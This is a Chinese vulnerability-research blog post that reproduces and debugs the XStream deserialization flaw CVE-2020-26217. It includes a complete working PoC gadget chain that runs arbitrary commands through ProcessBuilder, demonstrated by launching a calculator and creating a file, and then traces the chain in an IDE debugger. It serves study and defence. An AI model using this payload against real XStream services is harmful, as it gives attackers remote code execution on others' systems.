<div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xstream-2020-26217<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--引入 XStream 1.4.15 依赖--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.thoughtworks.xstream<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xstream<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.13<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>xstream-2020-26217<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<p>maven 拉取 xstream 成功后，先在 java 目录下创建一个 java.class 验证 xstream 是否可用，如下：</p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230816152445246.png" data-caption="image-20230816152445246"><img src="/../images/Java/deserialization/image-20230816152445246.png" alt="image-20230816152445246"></a></p>
<p>然后利用该代码进行漏洞调试，代码如下：</p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230816154712837.png" data-caption="image-20230816154712837"><img src="/../images/Java/deserialization/image-20230816154712837.png" alt="image-20230816154712837"></a></p>
<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XStreamExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="comment">// 定义一个XML字符串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="string">&quot;&lt;map&gt;poc&lt;/map&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建XStream对象</span></span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xstream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将XML字符串反序列化为对象</span></span><br><span class="line">        xstream.fromXML(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>其中 <code>String xml</code> 内容替换为上文提及的官方 <code>poc</code> ， 其中 <code>&lt;command&gt; &lt;/command&gt;</code> 标签填入需要执行的命令，笔者使用的是 <code>Ubuntu</code> ，弹出计算器的命令为 <code>gnome-calculator</code> ,完整代码如下</p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230816155321191.png" data-caption="image-20230816155321191"><img src="/../images/Java/deserialization/image-20230816155321191.png" alt="image-20230816155321191"></a></p>
<div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">import com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line">public class XStreamExample &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        // 定义一个XML字符串</span><br><span class="line">        String xml = &quot;<span class="tag">&lt;<span class="name">map</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;  <span class="tag">&lt;<span class="name">entry</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;      <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;      <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;        <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;          <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;            <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;            <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;              <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.spi.FilterIterator&#x27;</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                  <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.ArrayList$Itr&#x27;</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                    <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                    <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                    <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>1<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                    <span class="tag">&lt;<span class="name">outer-class</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                      <span class="tag">&lt;<span class="name">java.lang.ProcessBuilder</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                        <span class="tag">&lt;<span class="name">command</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>gnome-calculator\n<span class="tag">&lt;/<span class="name">string</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                        <span class="tag">&lt;/<span class="name">command</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                      <span class="tag">&lt;/<span class="name">java.lang.ProcessBuilder</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                    <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                  <span class="tag">&lt;/<span class="name">iter</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                  <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.ImageIO$ContainsFilter&#x27;</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                    <span class="tag">&lt;<span class="name">method</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                      <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">class</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                      <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                      <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                    <span class="tag">&lt;/<span class="name">method</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                    <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                  <span class="tag">&lt;<span class="name">next</span>/&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;              <span class="tag">&lt;/<span class="name">e</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;              <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                <span class="tag">&lt;<span class="name">pos</span>&gt;</span>0<span class="tag">&lt;/<span class="name">pos</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;              <span class="tag">&lt;/<span class="name">in</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;            <span class="tag">&lt;/<span class="name">is</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;            <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;          <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;          <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span>\n&quot; +</span><br><span class="line">                &quot;        <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;        <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;      <span class="tag">&lt;/<span class="name">value</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;    <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;    <span class="tag">&lt;<span class="name">string</span>&gt;</span>test<span class="tag">&lt;/<span class="name">string</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;<span class="tag">&lt;/<span class="name">map</span>&gt;</span>&quot;;</span><br><span class="line"></span><br><span class="line">        // 创建XStream对象</span><br><span class="line">        XStream xstream = new XStream();</span><br><span class="line"></span><br><span class="line">        // 将XML字符串反序列化为对象</span><br><span class="line">        xstream.fromXML(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>执行后，弹出计算器</p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230816155458123.png" data-caption="image-20230816155458123"><img src="/../images/Java/deserialization/image-20230816155458123.png" alt="image-20230816155458123"></a></p>
<p>亦可执行其他命令，如下，创建一个 <code>test.txt</code> 文件</p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230816155658396.png" data-caption="image-20230816155658396"><img src="/../images/Java/deserialization/image-20230816155658396.png" alt="image-20230816155658396"></a></p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230816155805410.png" data-caption="image-20230816155805410"><img src="/../images/Java/deserialization/image-20230816155805410.png" alt="image-20230816155805410"></a></p>
<blockquote>
<p>漏洞分析</p>
</blockquote>
<p>先对该 Poc 进行分析，了解其构造过程，方便下面的调试。回到 Poc 分析其 Poc 代码含义，新建 poc.xml 内容为漏洞 Poc，然后利用 <code>firefox</code> 打开 poc.xml ,然后将 Poc 折叠，得到如下图，第一层元素为 <code>&lt;map&gt;&lt;/map&gt;</code> , 第二层元素为 <code>&lt;entry&gt;&lt;/entry&gt;</code> 这两层下带有两个元素 <code>jdk.nashorn.internal.objects.NativeString</code> 和 <code>string</code></p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818155012194.png" data-caption="image-20230818155012194"><img src="/../images/Java/deserialization/image-20230818155012194.png" alt="image-20230818155012194"></a></p>
<p>利用如下代码，构建一个案例，可清晰了解到其作用</p>
<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 导入 XStream 类</span></span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"><span class="comment">// 导入HashMap类</span></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="comment">// 导入Map类</span></span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个名为Person的自定义类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="comment">// 设置属性</span></span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// Person 类的构造函数，接受姓名和年龄参数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="comment">// 将传入的姓名赋值给name属性</span></span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="comment">// 将传入的年龄赋值给age属性</span></span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个 MapTest 类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MapTest</span> &#123;</span><br><span class="line">	<span class="comment">// 主方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个HashMap对象，命名为map</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">// 将一个Person对象作为键，字符串&quot;test&quot;作为值，添加到map中</span></span><br><span class="line">        map.put(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;John&quot;</span>, <span class="number">18</span>), <span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个XStream对象，用于将对象转换为XML</span></span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xstream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        <span class="comment">// 将map对象转换为XML字符串，并将结果赋值给xml变量</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> xstream.toXML(map);</span><br><span class="line">        <span class="comment">// 打印XML字符串到控制台</span></span><br><span class="line">        System.out.println(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>运行后结果如下：</p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818162034463.png" data-caption="image-20230818162034463"><img src="/../images/Java/deserialization/image-20230818162034463.png" alt="image-20230818162034463"></a></p>
<p>由代码可知，<code>map</code> 作为 <code>HashMap()</code> 的对象，然后将 <code>Person</code> 的键 <code>(&quot;John&quot;, 18)</code>、键值 <code>(&quot;test&quot;)</code> 加载到 <code>map</code> 中，然后利用 <code>xstream.toXML()</code> 序列化为 <code>xml</code> 格式</p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818161935225.png" data-caption="image-20230818161935225"><img src="/../images/Java/deserialization/image-20230818161935225.png" alt="image-20230818161935225"></a></p>
<p>通过上面分析可知，若利用 XStream 进行序列化会利用 HashMap() 进而生成如下格式：</p>
<div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">map对象名</span>&gt;</span>键<span class="tag">&lt;/<span class="name">map对象名</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>值<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure></div>



<p>将 Poc 再展开一层，通过上面分析可知，整个 Poc 可以看作为一个 map 集合，然后 map 集合下面有许多元素，其中 <code>jdk.nashorn.internal.objects.NativeString</code> 为 <code>HashMap()</code> 的对象， <code>jdk.nashorn.internal.objects.NativeString</code> 又带有 <code>&lt;flag&gt;</code> 和 <code>&lt;value&gt;</code> 属性，其值分别为 <code>0</code>、<code>com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</code> </p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818162426050.png" data-caption="image-20230818162426050"><img src="/../images/Java/deserialization/image-20230818162426050.png" alt="image-20230818162426050"></a></p>
<p>再展开 value 值后得到更多具体的元素，这样在调试代码时可以清晰地知道该追踪哪些代码进行分析</p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818163930547.png" data-caption="image-20230818163930547"><img src="/../images/Java/deserialization/image-20230818163930547.png" alt="image-20230818163930547"></a></p>
<p>通过上面分析可知，XStream 在进行序列化前，(该Poc为例) 需先将 <code>&lt;jdk.nashorn.internal.objects.NativeString&gt;</code>、<code>&lt;string&gt;test&lt;/string&gt;</code> 该键值对利用 <code>HashMap()</code> 获取其 <code>hash</code> 值，然后再进行序列化</p>
<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">map.put(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;John&quot;</span>, <span class="number">18</span>), <span class="string">&quot;test&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818161935225.png" data-caption="image-20230818161935225"><img src="/../images/Java/deserialization/image-20230818161935225.png" alt="image-20230818161935225"></a></p>
<blockquote>
<p>具体开展分析</p>
</blockquote>
<p>分析其利用链（Gadgets），通过 <code>Poc</code> 可发现，其最后执行命令使用了 <code>java.lang.ProcessBuilder</code> 类中的 <code>start()</code> 方法，现我们跟进类中的 <code>start()</code> 获取整个利用链</p>
<p><em>注释：<code>java.lang.ProcessBuilder</code> 是 Java 标准库中的一个类，用于创建和管理外部进程。它提供了一种在 Java 程序中执行外部命令的方式，通过<code>java.lang.ProcessBuilder</code>  可以指定要执行的命令及其参数，并设置执行命令时的环境变量、工作目录等。然后使用 <code>start()</code> 方法来启动进程，并获取与该进程相关的输入流、输出流和错误流。</em></p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819150846588.png" data-caption="image-20230819150846588"><img src="/../images/Java/deserialization/image-20230819150846588.png" alt="image-20230819150846588"></a></p>
<p>因为 <code>xstreaam</code> 中已经包含了 <code>java.lang.ProcessBuilder</code> 类，所以我们在代码中并不需要导入，但我们可以通过先导入方便我们进行分析，跟进其代码便于找到 <code>start()</code> 方法</p>
<p>现导入 <code>import java.lang.ProcessBuilder;</code> 然后将<code>鼠标移至 ProcessBuilder + 鼠标左键</code>，进入 <code>ProcessBuilder</code> 类</p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230817144037081.png" data-caption="image-20230817144037081"><img src="/../images/Java/deserialization/image-20230817144037081.png" alt="image-20230817144037081"></a></p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230817144218001.png" data-caption="image-20230817144218001"><img src="/../images/Java/deserialization/image-20230817144218001.png" alt="image-20230817144218001"></a></p>
<p>进入到 <code>ProcessBuilder</code> 类后，继续寻找 <code>start()</code> 方法，鼠标选中 <code>ProcessBuilder</code> 后，鼠标移至停留，弹出该类的具体描述，简单的意思是：<code>java.lang.ProcessBuilder</code> 是 Java 标准库中的一个类，用于创建操作系统进程。每个 <code>ProcessBuilder</code> 实例管理一组进程属性。<code>start()</code> 方法使用这些属性创建一个新的 <code>Process</code> 实例。可以从同一个 <code>ProcessBuilder</code> 实例重复调用 <code>start()</code> 方法，以创建具有相同或相关属性的新子进程。具体可自行翻译查看。</p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230817144435568.png" data-caption="image-20230817144435568"><img src="/../images/Java/deserialization/image-20230817144435568.png" alt="image-20230817144435568"></a></p>
<p>接着我们点击图中的 <code>start()</code> 方法进入到 <code>start()</code> 方法的具体描述，最后通过 <code>鼠标右键</code> 该描述 <code>Jump to Source</code> 进入到 <code>java.lang.ProcessBuilder#start()</code> 方法中 </p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230817145146400.png" data-caption="image-20230817145146400"><img src="/../images/Java/deserialization/image-20230817145146400.png" alt="image-20230817145146400"></a></p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230817145324226.png" data-caption="image-20230817145324226"><img src="/../images/Java/deserialization/image-20230817145324226.png" alt="image-20230817145324226"></a></p>
<p>通过 <code>Poc</code> 可知最后执行的是由 <code>java.lang.ProcessBuilder</code> 类下的 <code>command</code> 对象触发命令执行，所以断点如下：</p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230817145652475.png" data-caption="image-20230817145652475"><img src="/../images/Java/deserialization/image-20230817145652475.png" alt="image-20230817145652475"></a></p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230817150416568.png" data-caption="image-20230817150416568"><img src="/../images/Java/deserialization/image-20230817150416568.png" alt="image-20230817150416568"></a></p>
<p>返回 <code>XStreamExample.java</code> 文件中运行 <code>debug</code> ，鼠标右键点击 Debug 按钮，获得该代码的完整利用链</p>
